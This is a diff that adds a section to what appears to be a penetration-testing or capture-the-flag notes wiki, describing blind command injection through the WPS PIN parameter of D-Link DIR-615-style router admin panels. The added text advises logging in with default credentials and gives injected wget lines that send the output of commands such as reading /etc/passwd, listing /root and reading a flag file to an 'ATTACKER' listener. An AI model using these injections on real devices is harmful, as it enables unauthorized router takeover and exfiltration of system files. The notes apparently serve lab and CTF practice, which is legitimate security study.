@@ -154,3 +154,36 @@ Triage from `expdb` boot logs: `img_auth_required = 0` plus a `cert vfy(0 ms)` o
 ## Sources
 
 - HackTricks (hardware-physical-access), ingest slug `hacktricks-hardware`.
+
+## Router web-admin WPS command injection (D-Link DIR-615-style)
+
+Embedded router web UIs that accept a WPS enrollee PIN through the admin panel frequently pass the
+PIN straight into a shell command. On D-Link DIR-615 (and siblings) the `set_sta_enrollee_pin`
+parameter (submitted via the WPS page `do_wps.asp` -> `set_sta_enrollee_pin.cgi`) is unsanitized ->
+command injection, running as the httpd user (commonly root on these firmwares).
+
+- Reach the panel with default creds first (D-Link default: `admin` / blank password). See
+  [[default-credentials]].
+- Injection is BLIND (no output in the HTTP response). BusyBox `wget` is almost always present;
+  `base64` and multi-line output usually are NOT, and a newline breaks a GET. So exfil a single
+  space-free token in the URL PATH to a listener you control:
+
+```
+# attacker
+python3 -m http.server 80
+# injected into set_sta_enrollee_pin  (+ = URL-encoded space):
+wget+http://ATTACKER/$(cat+/etc/passwd)
+wget+http://ATTACKER/$(ls+/root/)
+wget+http://ATTACKER/$(cat+/root/flag.txt)
+```
+
+The incoming request path in your `http.server` log is the command output. Command substitution
+`$(...)` (or backticks) runs on the target; keep the substituted output a single token (no
+spaces/newlines) or the GET path breaks.
+
+Generalizes to any embedded admin field that feeds a shell (ping/traceroute diagnostics, WPS PIN,
+DDNS hostname, firmware-update URL). On emulated router boxes the httpd backend can be slow to boot
+behind the port-forward, see [[bug-hunting-methodology]] for triaging "port accepts TCP but returns
+nothing". Related: [[iot-attacks]].
+
+<!-- promoted-slug: dlink-wps-cmd-injection -->
